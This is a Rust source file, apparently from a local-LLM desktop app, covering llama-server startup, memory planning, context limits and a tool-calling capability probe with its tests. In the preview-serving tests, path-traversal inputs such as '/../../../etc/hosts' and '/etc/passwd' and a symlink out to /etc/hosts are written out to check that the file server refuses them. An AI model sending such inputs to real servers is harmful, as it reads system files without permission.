/// PACK_RATIO_DEFAULT: a bad ratio must never produce a pack nothing can read.
fn pack_split_ratio(internal_bw: f64, external_bw: f64) -> f64 {
    if !internal_bw.is_finite() || !external_bw.is_finite() || internal_bw <= 0.0 || external_bw <= 0.0
    {
        return PACK_RATIO_DEFAULT;
    }
    let sum = internal_bw + external_bw;
    if !sum.is_finite() || sum <= 0.0 {
        return PACK_RATIO_DEFAULT;
    }
    let scale = 10f64.powi(PACK_RATIO_DECIMALS as i32);
    let r = (internal_bw / sum * scale).round() / scale;
    if !r.is_finite() || !(PACK_RATIO_MIN..=PACK_RATIO_MAX).contains(&r) {
        return PACK_RATIO_DEFAULT;
    }
    r
}

/// The one spelling of a ratio that ever reaches a file or an environment
/// variable. Fixed decimals, so the planner and the engine parse the same
/// characters.
fn pack_ratio_text(ratio: f64) -> String {
    format!("{ratio:.*}", PACK_RATIO_DECIMALS)
}

#[cfg(test)]
mod pack_ratio_tests {
    use super::*;

    #[test]
    fn optimum_puts_the_bigger_share_on_the_faster_volume() {
        // Two identical NVMe drives: half each, which is where the compiled
        // 0.7157 cost the most.
        assert_eq!(pack_split_ratio(6.0, 6.0), 0.5);
        // The pair the frozen constant was measured on: Bi/Be = 2.52.
        assert_eq!(pack_split_ratio(2.52, 1.0), 0.7159);
        // Fast internal, slow external, and the reverse.
        assert_eq!(pack_split_ratio(6.0, 1.0), 0.8571);
        assert_eq!(pack_split_ratio(1.0, 6.0), 0.1429);
    }

    #[test]
    fn a_failed_measurement_falls_back_to_the_historical_cut() {
        assert_eq!(pack_split_ratio(0.0, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(6.0, 0.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(-1.0, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(f64::NAN, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(f64::INFINITY, 6.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(6.0, f64::NAN), PACK_RATIO_DEFAULT);
    }

    #[test]
    fn a_ratio_outside_the_bounds_falls_back_instead_of_being_clamped() {
        // 100:1 is not a pair of SSDs, it is a broken probe. Clamping to 0.95
        // would write a pack from a measurement nobody should trust.
        assert_eq!(pack_split_ratio(100.0, 1.0), PACK_RATIO_DEFAULT);
        assert_eq!(pack_split_ratio(1.0, 100.0), PACK_RATIO_DEFAULT);
        // The edges themselves are usable.
        assert_eq!(pack_split_ratio(19.0, 1.0), PACK_RATIO_MAX);
        assert_eq!(pack_split_ratio(1.0, 19.0), PACK_RATIO_MIN);
    }

    #[test]
    fn the_text_form_is_the_grid_the_engine_parses() {
        assert_eq!(pack_ratio_text(0.5), "0.5000");
        assert_eq!(pack_ratio_text(PACK_RATIO_DEFAULT), "0.7157");
        assert_eq!(pack_ratio_text(pack_split_ratio(6.0, 1.0)), "0.8571");
    }
}

/// Probe base for a pack destination dir: nearest existing ancestor, then the
/// mount root (the system data volume probes through $HOME).
fn probe_base_for(dir: &Path) -> PathBuf {
    let mut p = dir.to_path_buf();
    while !p.exists() && p.pop() {}
    if let Some((_, _, _, mount)) = df_line(&p.to_string_lossy()) {
        if mount == "/" || mount == "/System/Volumes/Data" {
            return PathBuf::from(std::env::var("HOME").unwrap_or_else(|_| "/".into()));
        }
        return PathBuf::from(mount);
    }
    p
}

// ---------------------------------------------------------------- server

struct ServerState {
    child: Option<Child>,
    model_id: Option<String>,
    phase: String, // stopped | starting | ready | failed
    generation: u64,
    /// Port actually bound by the running server (0 when stopped).
    port: u16,
    /// Engine regime: resident-bit-exact | streamed-bit-exact | cpu-bit-exact
    /// | stock-llamacpp (a dense model, which streams nothing).
    mode: String,
    /// Decode slots the running server was started with (--parallel).
    slots: u32,
    /// Context window per slot the running server was started with.
    ///
    /// The setting offers 8K to 128K, and ctx_per_slot_for clamps it to what
    /// the model declares (or to a cautious 32K when it declares nothing). The
    /// UI painted the STORED value, so someone who chose 128K saw 128K on a
    /// server running 32K, with nothing saying the request had been reduced.
    ctx_per_slot: u32,
    /// Measured tool-calling verdict for the running model (see ServerStatus).
    tools_ok: Option<bool>,
    /// The footprint mode this server was actually started in, and why. None
    /// while stopped.
    footprint: Option<ModeDecision>,
}

static SERVER: OnceLock<Mutex<ServerState>> = OnceLock::new();
static SERVER_GEN: AtomicU64 = AtomicU64::new(0);

fn server_state() -> &'static Mutex<ServerState> {
    SERVER.get_or_init(|| {
        Mutex::new(ServerState {
            child: None,
            model_id: None,
            phase: "stopped".into(),
            generation: 0,
            port: 0,
            mode: String::new(),
            slots: 1,
            ctx_per_slot: 0,
            tools_ok: None,
            footprint: None,
        })
    })
}

// ---------------------------------------------------------------- decode slots
//
// llama-server splits --ctx-size across --parallel slots, so N slots at the
// same per-conversation window cost N times the KV cache and nothing else:
// measured on Qwen3-30B-A3B Q8_0 (resident-bit-exact, M5 Max 128 GB), the
// resident footprint goes 29.6 GB at 1 slot / 8192, 30.4 GB at 2 slots /
// 16384, 32.0 GB at 4 slots / 32768: about 0.8 GB per extra slot, with
// single-stream generation unchanged. That is what makes several
// conversations able to generate at once, and it is why the window per slot
// is held at CTX_PER_SLOT instead of being divided.
//
// The app never runs more concurrent turns than there are slots (see the slot
// pool in main.ts): the bound is this number, not a UI convention.

/// Context window every slot keeps by default, whatever the slot count.
///
/// This was the ONLY value for two years, and it is the one every memory figure
/// in this file was measured at. It stays the default and the unit the KV cost
/// below is expressed in.
const CTX_PER_SLOT: u32 = 8192;

/// The largest window offered to a model whose training context nobody recorded.
///
/// Asking for more than a model was trained on does not fail: llama.cpp extends
/// the rope and the answers quietly get worse, which is the failure mode this
/// project exists to avoid. A registry entry that states its own
/// `context_length` is believed; anything else is held here, comfortably inside
/// what every model in the catalogue was trained on.
const CTX_CEILING_UNKNOWN: u32 = 32_768;




/// How the engine is told to parse a chat turn, in one place.
///
/// `--jinja` has always been here. `--reasoning-format deepseek` is the flag
/// that lets the app show a model thinking, and the three values are NOT
/// interchangeable:
///
///   none             leaves the thoughts unparsed inside `message.content`,
///                    so the answer arrives with raw `<think>` tags in it.
///   deepseek-legacy  extracts them AND re-inlines them into the content while
///                    streaming (server-schema.cpp sets `reasoning_in_content`
///                    for exactly this value), so the tags come back on screen.
///   deepseek         puts them in `message.reasoning_content`, including in
///                    every streaming delta, and leaves `content` holding the
///                    answer alone. The only one of the three that lets the
///                    two be shown differently.
///
/// It is passed EXPLICITLY even though this build already defaults to it
/// (`common_params::reasoning_format` in common/common.h). The flag's own help
/// text in common/arg.cpp announces a different default, "auto", so the
/// default is a thing two parts of llama.cpp disagree about, and a vendored
/// dependency is bumped by whoever is bumping it. Stating the value costs two
/// arguments and removes the app's most visible behaviour from that argument.
pub(crate) fn chat_parsing_args() -> [&'static str; 3] {
    ["--jinja", "--reasoning-format", "deepseek"]
}

/// Does the `numerics` setting ask for the bit-exact expert path?
///
/// ONLY the exact word "standard" gives it up. Anything else (unset, empty,
/// a value written by a future version, a typo) keeps the certified path,
/// because losing certified numerics has to be something the user chose and
/// not something that happened to a settings file. See the measurement at the
/// call site for what the choice is worth.
pub(crate) fn bit_exact_numerics(setting: Option<&str>) -> bool {
    setting.map(|v| v.trim() != "standard").unwrap_or(true)
}
/// Hard ceiling on slots: past this the KV cache stops being free and a Mac
/// with a big model would pay it in evictions.
const MAX_SLOTS: u32 = 4;
/// Resident cost of one decode slot beyond the first, from the measurements
/// above: 29.6 GB at one slot, 30.4 at two, 32.0 at four. The planner has to
/// pay it, or a two-slot default silently spends 0.8 GB it never budgeted.
const KV_BYTES_PER_EXTRA_SLOT: u64 = 800_000_000;

/// What a dense model pays beyond its own weights.
///
/// The graph, the compute buffers and the scratch every engine allocates,
/// whatever the architecture. It is the same 2.5 GB the MoE branch charges as
/// its fixed term; a dense model does not escape it for having no experts.
const DENSE_RUNTIME_OVERHEAD: u64 = 2_500_000_000;



#[derive(Serialize, Clone)]
struct ServerStatus {
    running: bool,
    model_id: Option<String>,
    port: u16,
    phase: String,
    mode: String,
    /// Concurrent decode streams the running engine can serve.
    slots: u32,
    /// Whether this model actually emits tool calls, MEASURED at warmup.
    ///
    /// None while unknown (server starting, or the probe has not answered).
    /// A model that cannot call tools cannot drive the agent loop at all: it
    /// reads no file and runs no command, and every agent surface silently
    /// does nothing. The app disables those surfaces instead, which is only
    /// possible if it knows. Declaring the capability in the registry would
    /// have been cheaper and would have been wrong: it depends on the build,
    /// the chat template and the quantization, not on the model name.
    tools_ok: Option<bool>,
    /// The context window per slot the engine is actually serving, which is
    /// not always the one that was asked for.
    ctx_per_slot: u32,
    /// The memory-footprint decision this engine was started with: the mode
    /// asked for, the mode actually used, and the two numbers that separate
    /// them. The UI says so out loud when they differ, because a user who
    /// picked Performance and silently got Eco would rightly call that a bug.
    footprint: Option<ModeDecision>,
}

#[tauri::command(async)]
fn server_status() -> ServerStatus {
    let s = server_state().lock().unwrap_or_else(|e| e.into_inner());
    ServerStatus {
        running: s.child.is_some(),
        model_id: s.model_id.clone(),
        port: if s.port == 0 { SERVER_PORT_BASE } else { s.port },
        phase: s.phase.clone(),
        mode: s.mode.clone(),
        // Stopped: report what the NEXT start would give, so the UI never
        // promises a concurrency the engine will not have.
        slots: if s.child.is_some() { s.slots } else { crate::planner::engine_slots() },
        ctx_per_slot: s.ctx_per_slot,
        tools_ok: s.tools_ok,
        footprint: s.footprint.clone(),
    }
}

/// Ask the running model to call a trivial tool, and report whether it did.
///
/// This measures the one thing the agent loop cannot work without. It is a
/// capability of the running combination, not of the model name: the same
/// weights answer differently depending on the chat template baked into the
/// GGUF, on whether the server was started with --jinja, and on the
/// quantization. Declaring it in the registry would therefore have been a
/// guess dressed up as a fact.
///
/// `tool_choice` is left on auto ON PURPOSE. Forcing it would measure whether
/// the engine can constrain the grammar, which it always can; what the agent
/// loop needs is whether the model reaches for a tool on its own when the
/// question plainly calls for one. A model that answers in prose here will
/// answer in prose when asked to read a file.
fn probe_tool_calling(port: u16) -> Option<bool> {
    // Two budgets. The first is what an ordinary model needs; the second is for
    // one that thinks at length before it acts, and is only ever paid when the
    // first answer was cut off mid-sentence.
    for cap in PROBE_TOKEN_BUDGETS {
        let body = probe_body(cap);
        let out = Command::new("curl")
            .args(["-s", "--max-time", "180", "-H", "Content-Type: application/json", "-d", &body])
            .arg(format!("http://127.0.0.1:{port}/v1/chat/completions"))
            .output()
            .ok()?;
        match read_tool_verdict(&String::from_utf8_lossy(&out.stdout)) {
            Some(v) => return Some(v),
            // None means the answer was truncated, so it says nothing about the
            // model. Buy more room and ask again.
            None => continue,
        }
    }
    None
}

/// Token budgets for the capability probe, tried in order.
///
/// It was ONE budget of 64, and that number is where this bug lived. A reasoning
/// model spends its opening tokens thinking, so it was cut off long before it
/// reached the tool call, answered with no `tool_calls`, and was recorded as
/// incapable. Qwen3.6 and Mellum2 are both thinking models, and both had the
/// Code and Runs tabs locked against them by a measurement of nothing but the
/// budget. 64 tokens does not measure whether a model can call a tool; it
/// measures whether it can do so while barely being allowed to speak.
const PROBE_TOKEN_BUDGETS: [u32; 2] = [512, 4096];

/// The probe request, at a given token budget.
///
/// `enable_thinking:false` is passed through `chat_template_kwargs`, which the
/// Qwen family honours and every other template ignores: a model that can be
/// asked to skip its reasoning for one question answers this one in a few
/// tokens. It is a shortcut, not the fix, which is why the budgets above are
/// sized to work even when it is ignored.
fn probe_body(max_tokens: u32) -> String {
    format!(
        r#"{{
      "model":"galactus-local",
      "messages":[{{"role":"user","content":"What time is it right now? Use the tool."}}],
      "tools":[{{"type":"function","function":{{
        "name":"get_current_time",
        "description":"Return the current time. Call this whenever the user asks what time it is.",
        "parameters":{{"type":"object","properties":{{}},"required":[]}}}}}}],
      "tool_choice":"auto","max_tokens":{max_tokens},"stream":false,"temperature":0,
      "chat_template_kwargs":{{"enable_thinking":false}}
    }}"#
    )
}

/// Read the verdict out of one chat-completions answer.
///
/// Split out of the probe so the part that can actually be wrong is testable
/// without a 32 GB model: the transport is curl, which either answers or does
/// not, while THIS is where a build that emits an empty `tool_calls` array
/// beside a prose reply would be misread as capable.
///
/// Returns None only when the body is not JSON at all, which means the probe
/// itself failed and the question stays open. Every parseable answer yields a
/// definite yes or no.
fn read_tool_verdict(body: &str) -> Option<bool> {
    let v: serde_json::Value = serde_json::from_str(body).ok()?;
    // A server whose chat template carries no tool support answers with an
    // error rather than a choice. That is a definite no, not an unknown.
    if v.get("error").is_some() {
        return Some(false);
    }
    let calls = v
        .get("choices")
        .and_then(|c| c.get(0))
        .and_then(|c| c.get("message"))
        .and_then(|m| m.get("tool_calls"))
        .and_then(|t| t.as_array());
    let named = |a: &Vec<serde_json::Value>| {
        a.iter().any(|c| {
            c.pointer("/function/name").and_then(|n| n.as_str()).is_some_and(|n| !n.is_empty())
        })
    };
    if let Some(a) = calls {
        if named(a) {
            return Some(true);
        }
    }
    // No call. Before calling that a no, ask whether the model was allowed to
    // finish. finish_reason "length" means the budget ran out mid-answer, and an
    // answer that was cut off is evidence about the budget, not about the model:
    // a reasoning model reaches its tool call after its thinking, so a short
    // budget produced a confident, permanent, wrong "cannot call tools" that
    // locked the Code and Runs tabs. Unknown, so the caller can buy more room.
    let truncated = v
        .pointer("/choices/0/finish_reason")
        .and_then(|f| f.as_str())
        .is_some_and(|f| f == "length");
    if truncated {
        return None;
    }
    Some(false)
}

#[cfg(test)]
mod preview_serving_tests {
    use super::{percent_decode, preview_file_for, preview_mime, preview_set_root};
    use std::path::{Path, PathBuf};

    fn scratch(name: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("galactus-preview-{name}"));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(p.join("sub")).unwrap();
        std::fs::write(p.join("index.html"), b"<h1>hi</h1>").unwrap();
        std::fs::write(p.join("styles.css"), b"body{}").unwrap();
        std::fs::write(p.join("sub/deep.js"), b"//").unwrap();
        p
    }

    #[test]
    fn a_bare_path_is_the_index() {
        let dir = scratch("index");
        preview_set_root(Some(dir.display().to_string())).unwrap();
        assert!(preview_file_for("/").unwrap().ends_with("index.html"));
        assert!(preview_file_for("").unwrap().ends_with("index.html"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn sub_resources_resolve_inside_the_folder() {
        // The reason this exists at all: a site is index.html PLUS the files it
        // asks for. The published-document path answers one document and would
        // have served the HTML again for styles.css.
        let dir = scratch("sub");
        preview_set_root(Some(dir.display().to_string())).unwrap();
        assert!(preview_file_for("/styles.css").unwrap().ends_with("styles.css"));
        assert!(preview_file_for("/sub/deep.js").unwrap().ends_with("deep.js"));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn nothing_outside_the_folder_is_served() {
        // The containment IS the security. Canonicalising first is what makes it
        // hold: "..", an absolute path and a symlink out of the tree all look
        // innocent until the filesystem has resolved them.
        let dir = scratch("escape");
        preview_set_root(Some(dir.display().to_string())).unwrap();
        for path in ["/../../../etc/hosts", "/etc/passwd", "/sub/../../../../etc/hosts"] {
            assert!(preview_file_for(path).is_none(), "{path} must not be served");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_symlink_pointing_out_is_refused() {
        let dir = scratch("symlink");
        #[cfg(unix)]
        {
            let _ = std::os::unix::fs::symlink("/etc/hosts", dir.join("out.txt"));
            preview_set_root(Some(dir.display().to_string())).unwrap();
            assert!(preview_file_for("/out.txt").is_none(), "a link out of the tree is out");
        }
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn nothing_is_served_when_no_folder_is_set() {
        preview_set_root(None).unwrap();
        assert!(preview_file_for("/index.html").is_none());
    }

    #[test]
    fn a_space_in_a_name_survives_the_url() {
        let dir = scratch("space");
        std::fs::write(dir.join("my file.css"), b"body{}").unwrap();
        preview_set_root(Some(dir.display().to_string())).unwrap();
        assert!(preview_file_for("/my%20file.css").is_some(), "a browser escapes the space");
        assert_eq!(percent_decode("a%20b%2Fc"), "a b/c");
        assert_eq!(percent_decode("plain"), "plain", "and leaves the rest alone");
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn an_unknown_extension_is_not_guessed_at() {
        // Serving an unknown binary as text/html is how a download becomes a
        // page the webview tries to render.
        assert_eq!(preview_mime(Path::new("a.html")), "text/html; charset=utf-8");
        assert_eq!(preview_mime(Path::new("a.woff2")), "font/woff2");
        assert_eq!(preview_mime(Path::new("a.zzz")), "application/octet-stream");
        assert_eq!(preview_mime(Path::new("noext")), "application/octet-stream");
    }
}

#[cfg(test)]
mod folder_chooser_tests {
    use super::classify_chooser_failure;

    #[test]
    fn cancelling_is_not_a_fault_in_any_language() {
        // The reason this test names languages: the first version matched the
        // English sentence, and the machine it shipped to was French. An
        // ordinary cancel was then reported to the user as a broken chooser,
        // which is the exact confusion the error message existed to end.
        assert_eq!(classify_chooser_failure("execution error: User canceled. (-128)"), None);
        assert_eq!(
            classify_chooser_failure("15:70: execution error: Annule par l'utilisateur. (-128)"),
            None,
            "a French Mac cancels in French and the code is what says so",
        );
        assert_eq!(classify_chooser_failure("Vorgang vom Benutzer abgebrochen. (-128)"), None);
        assert_eq!(classify_chooser_failure(""), None);
        assert_eq!(classify_chooser_failure("   \n  "), None);
    }

    #[test]
    fn a_refused_apple_event_names_its_own_remedy() {
        // -1743 is macOS refusing the app permission. No amount of clicking the
        // button fixes it, so the message has to say where the switch is.
        let msg = classify_chooser_failure("execution error: Not allowed to send Apple events (-1743)")
            .expect("a refusal is a fault");
        assert!(msg.contains("Automation"), "the message must name the settings pane");
    }

    #[test]
    fn any_other_failure_is_reported_verbatim_and_on_one_line() {
        // The point is to end the guessing: whatever osascript said reaches the
        // user, who can read it back. One line, because a toast is one line.
        let msg = classify_chooser_failure("something broke\nstack line 2\nstack line 3")
            .expect("an unknown failure is still a fault");
        assert!(msg.contains("something broke"));
        assert!(!msg.contains("stack line 2"));
    }
}



#[cfg(test)]
mod policy_refresh_tests {
    use super::root_is_a_checkout;
    use std::path::PathBuf;

    fn scratch(name: &str) -> PathBuf {
        let p = std::env::temp_dir().join(format!("galactus-refresh-{name}"));
        let _ = std::fs::remove_dir_all(&p);
        std::fs::create_dir_all(&p).unwrap();
        p
    }

    #[test]
    fn a_checkout_is_never_overwritten() {
        // Somebody's working tree: the registry there is edited, measured into
        // and committed, and a copy from the bundle would destroy that between
        // two launches.
        let p = scratch("dir");
        std::fs::create_dir_all(p.join(".git")).unwrap();
        assert!(root_is_a_checkout(&p));
        let _ = std::fs::remove_dir_all(&p);
    }

    #[test]
    fn a_worktree_counts_as_a_checkout_too() {
        // git puts a FILE named .git in a linked worktree, not a directory, and
        // a test for is_dir would have written straight into one.
        let p = scratch("worktree");
        std::fs::write(p.join(".git"), "gitdir: /elsewhere/.git/worktrees/x").unwrap();
        assert!(root_is_a_checkout(&p));
        let _ = std::fs::remove_dir_all(&p);
    }

    #[test]
    fn a_plain_folder_is_refreshed() {
        // The provisioned folder, and any folder a user pointed the app at:
        // no history to lose, and a catalogue that has to stay current.
        let p = scratch("plain");
        std::fs::create_dir_all(p.join("scripts")).unwrap();
        assert!(!root_is_a_checkout(&p));
        let _ = std::fs::remove_dir_all(&p);
    }
}

#[cfg(test)]
mod tool_probe_tests {
    use super::{probe_body, read_tool_verdict, PROBE_TOKEN_BUDGETS};

    #[test]
    fn a_truncated_answer_is_not_a_verdict() {
        // What a thinking model returns when the budget ends inside its
        // reasoning: no call, and finish_reason saying why. Reading this as
        // "cannot call tools" is what locked the Code tab on Qwen3.6.
        let body = r#"{"choices":[{"finish_reason":"length","message":{
            "role":"assistant","content":"","reasoning_content":"The user wants the time, so I should"}}]}"#;
        assert_eq!(read_tool_verdict(body), None, "truncation says nothing about the model");
    }

    #[test]
    fn a_complete_answer_with_no_call_is_a_definite_no() {
        // The distinction the test above depends on: a model that finished its
        // sentence and still did not reach for the tool really cannot be driven.
        let body = r#"{"choices":[{"finish_reason":"stop","message":{
            "role":"assistant","content":"I do not have access to the current time."}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn the_probe_gives_a_reasoning_model_room_to_reach_its_tool_call() {
        // 64 was the shipped value and it measured the budget, not the model.
        assert!(
            PROBE_TOKEN_BUDGETS[0] >= 256,
            "a thinking model spends its opening tokens thinking",
        );
        assert!(
            PROBE_TOKEN_BUDGETS[1] > PROBE_TOKEN_BUDGETS[0],
            "the retry must buy more room than the first attempt",
        );
        for cap in PROBE_TOKEN_BUDGETS {
            let body = probe_body(cap);
            assert!(body.contains(&format!("\"max_tokens\":{cap}")));
            // Auto on purpose: forcing the call would measure the grammar
            // engine, not whether the model reaches for a tool by itself.
            assert!(body.contains("\"tool_choice\":\"auto\""));
            assert!(body.contains("\"enable_thinking\":false"));
            assert!(serde_json::from_str::<serde_json::Value>(&body).is_ok(), "probe body is JSON");
        }
    }

    #[test]
    fn a_real_tool_call_reads_as_capable() {
        // Shape captured from the running engine on Qwen3-30B-A3B.
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"","tool_calls":[
            {"type":"function","function":{"name":"get_current_time","arguments":"{}"},"id":"ai28"}]}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(true));
    }

    #[test]
    fn a_prose_answer_reads_as_incapable() {
        let body = r#"{"choices":[{"message":{"role":"assistant","content":"It is about noon."}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn an_empty_array_is_not_a_tool_call() {
        // The trap: a build that always emits the key, empty, beside prose.
        // Testing for the key's presence would have called this one capable.
        let body = r#"{"choices":[{"message":{"content":"Noon.","tool_calls":[]}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn a_nameless_call_is_not_a_tool_call() {
        let body = r#"{"choices":[{"message":{"tool_calls":[{"type":"function","function":{"arguments":"{}"}}]}}]}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
        let empty = r#"{"choices":[{"message":{"tool_calls":[{"function":{"name":""}}]}}]}"#;
        assert_eq!(read_tool_verdict(empty), Some(false));
    }

    #[test]
    fn a_template_without_tool_support_is_a_definite_no() {
        let body = r#"{"error":{"code":500,"message":"this chat template does not support tools"}}"#;
        assert_eq!(read_tool_verdict(body), Some(false));
    }

    #[test]
    fn a_non_json_answer_leaves_the_question_open() {
        // curl timed out, or the server died mid-probe. Reporting "incapable"
        // here would disable the Code view over a transport failure.
        assert_eq!(read_tool_verdict(""), None);
        assert_eq!(read_tool_verdict("<html>502</html>"), None);
    }
}




// ------------------------------------------------ what this Mac can give NOW
//
// Two numbers were being confused with each other, and the confusion is what a
// colleague on a 24 GB Mac read as "Compute error.":
//
//   - the memory the Mac was SOLD with (`sysctl hw.memsize`), minus a fixed
//     reserve. A constant guessed on somebody else's machine.
//   - the memory the Mac can hand over RIGHT NOW (`vm_stat`), which is the
//     only number the allocator answers to.
//
// The planner used the first and never looked at the second.

/// Share of the measured free pool the engine may claim: four fifths.
///
/// The reading is a snapshot taken seconds before llama-server starts
/// allocating, and the machine does not hold still in between: a tab opens,
/// Spotlight indexes, this app's own webview grows. One fifth of the pool is
/// what absorbs that drift, and it is also the honest price of counting
/// inactive pages as available, since macOS hands them over readily but
/// neither instantly nor always in full.
///
/// A FRACTION of the measured pool, not a constant, and that is the whole
/// point: a constant is exactly the mistake being replaced here. A fifth of
/// 4 GB free is a 0.8 GB cushion on a machine with nothing to spare, and a
/// fifth of 100 GB free is 20 GB on a machine that has plenty. The cushion has
/// to scale with the thing it is cushioning.
const AVAILABLE_CLAIM_NUM: u64 = 4;
const AVAILABLE_CLAIM_DEN: u64 = 5;

/// Total resident bytes the engine may occupy: non-expert weights, runtime
/// overhead and expert arena TOGETHER, not one of the three.
///
/// `available` is what `available_memory_bytes()` measured, and None when
/// vm_stat could not be read or parsed. A missing measurement falls back to
/// the hardware bound instead of refusing everything: no worse than the
/// behaviour this replaces, and a broken probe must never make the app
/// unusable.
///
/// `installed` reaches this from `ram_gb * 1e9`, which understates a machine
/// sold in GiB by about 7 percent, while `available` is real bytes from
/// vm_stat. The mismatch only ever makes the hardware bound smaller than the
/// truth, and a bound that errs toward leaving memory free is the one to keep.
/// The three readings that bound a start, and the one number every registry
/// `min_ram_gb` is written against.
///
/// Grouped rather than passed one by one because they answer the same
/// question, "what can this Mac give", and because they arrive together: one
/// is a property of the hardware, one is a measurement taken seconds before
/// the engine allocates, and one is what the GPU driver will actually let the
/// process hold.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
struct MachineLimits {
    /// `hw.memsize >> 30`. GiB, because that is the unit every `min_ram_gb`
    /// in the registry is written in.
    ram_gb: u64,
    /// vm_stat free plus inactive plus speculative. `None` when vm_stat could
    /// not be read.
    available: Option<u64>,
    /// `MTLDevice.recommendedMaxWorkingSetSize`. `None` when there is no Metal
    /// device (headless CI, a VM without GPU passthrough).
    gpu_working_set: Option<u64>,
}

impl MachineLimits {
    /// Read the machine. The only place these three come from a real Mac.
    fn probe(ram_gb: u64) -> Self {
        Self {
            ram_gb,
            available: available_memory_bytes(),
            gpu_working_set: hardware::gpu_limits().map(|g| g.working_set_bytes),
        }
    }

    /// A Mac for a test: installed GiB and what vm_stat would report, with no
    /// Metal reading. That is exactly the shape every planner test asserted
    /// before the GPU working set became a bound, so the numbers they pin stay
    /// the numbers they pinned.
    #[cfg(test)]
    fn mac(ram_gb: u64, available: Option<u64>) -> Self {
        Self { ram_gb, available, gpu_working_set: None }
    }
}



/// The footprint modes, from the hungriest to the leanest. The step-down walks
/// this array, so its order IS the policy.
const MODE_LADDER: [&str; 3] = ["perf", "balanced", "eco"];

/// What the engine would hold resident in each mode, for one model on one
/// machine. Bytes, weights and runtime overhead included, not just the arena.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
struct ModeFootprints {
    eco: u64,
    balanced: u64,
    perf: u64,
}

impl ModeFootprints {
    fn resident(&self, mode: &str) -> u64 {
        match mode {
            "eco" => self.eco,
            "perf" => self.perf,
            _ => self.balanced,
        }
    }
}

/// The mode a start will actually use, and the numbers that justify it.
#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
struct ModeDecision {
    /// The mode the engine is started in.
    mode: String,
    /// The mode the user asked for. Different from `mode` after a step-down.
    requested: String,
    /// True when not even eco fits. The start is then refused with a sentence
    /// about memory, rather than spawning an engine that will die mid-graph.
    impossible: bool,
    /// What the engine will hold, all three terms together.
    resident_bytes: u64,
    /// What the machine can give right now.
    budget_bytes: u64,
}



/// Everything a start needs from the planner: the numbers the engine is given,
/// and the mode decision that produced them.
#[derive(Clone, Debug)]
struct CachePlan {
    cache_bytes: u64,
    /// SLRU protected fraction.
    protected: f64,
    /// Physical micro-batch.
    ubatch: u32,
    decision: ModeDecision,
}

// ------------------------------------------------- what to choose, per model
//
// The owner's instruction, verbatim: case by case, model after model, rather
// than one global rule. Every function below takes ONE registry entry and ONE
// machine, and none of them holds an opinion that applies to all ten models.
//
// Where the policy LIVES: in the registry entry, next to the geometry and the
// measured curve that the same entry already carries. The optional keys these
// functions read are documented on each function. When a key is absent the
// answer is derived from the geometry that IS there, and the derivation is
// today's behaviour, so a registry with no policy keys behaves exactly as it
// behaves now and every key added later only ever narrows a choice.

/// The most decode slots the app will ever recommend on its own.
///
/// A slot past the first is a whole extra KV cache: `KV_BYTES_PER_EXTRA_SLOT`,
/// 0.8 GB, measured. Above two, nothing the app can read tells it the user
/// wants a third conversation generating at the same time, so that stays an
/// explicit choice in Settings rather than a guess the machine pays for.
const RECOMMENDED_SLOT_CAP: u32 = 2;


/// A volume the installer could write a pack to.
#[derive(Clone, Debug, PartialEq)]
struct PackVolume {
    mount: String,
    free_bytes: u64,
    /// Measured sequential read bandwidth, GB/s, from `volume_bandwidth`.
    /// `None` when this volume has not been probed, and an unprobed volume is
    /// never chosen as the second half of a dual pack: the split ratio is
    /// computed FROM the two bandwidths, so guessing one would write a pack
    /// cut at the wrong place for the life of the install.
    bandwidth_gbs: Option<f64>,
}

/// Where a model's pack should be written.
#[derive(Serialize, Clone, Debug, PartialEq, Eq)]
#[serde(tag = "kind", rename_all = "kebab-case")]
enum PackLayout {
    /// One volume carries the whole pack.
    Single { mount: String },
    /// Both volumes carry a share of every record and are read in parallel.
    /// `internal` is the faster of the two and takes the larger share.
    Dual { internal: String, external: String },
    /// No arrangement of the mounted volumes has room for this model.
    NoRoom,
}

/// Bytes left free on a volume beyond the share it carries. Same 2 GiB the
/// download preflight keeps (`INSTALL_DOWNLOAD_RESERVE_GIB`): a volume filled
/// to its last byte is a volume macOS cannot work on.
const PACK_VOLUME_RESERVE: u64 = INSTALL_DOWNLOAD_RESERVE_GIB * 1024 * 1024 * 1024;

/// The slowest a second volume may be before splitting the pack across it
/// costs more than it buys.
///
/// Not a new number: it is the threshold the install pipeline already applies
/// as a fallback, and the one the install dialog already paints as its
/// bottleneck verdict. What was missing is that the user had to reach that
/// verdict by hand, by choosing dual and pressing Measure.
const DUAL_BANDWIDTH_FLOOR: f64 = 0.35;






/// Pick a port we can actually bind. A crashed run can leave an orphan holding
/// the previous one, and other software may squat it too, so instead of
/// fighting for a fixed port we scan a small range and take the first free
/// slot. Orphaned llama-servers of ours are reaped along the way.
/// Reap only servers WE left behind: a llama-server whose command line points
/// at the configured Galactus folder. A llama-server the user started by hand
/// elsewhere is never touched. Purely a memory courtesy, the dynamic port
/// already removes any bind conflict.
fn reap_orphan_servers(root: &Path) {
    let root_str = root.to_string_lossy().into_owned();
    let out = Command::new("pgrep").args(["-f", "llama-server"]).output();
    let pids: Vec<i32> = out
        .map(|o| {
            String::from_utf8_lossy(&o.stdout)
                .lines()
                .filter_map(|l| l.trim().parse().ok())
                .collect()
        })
        .unwrap_or_default();
    let me = std::process::id() as i32;
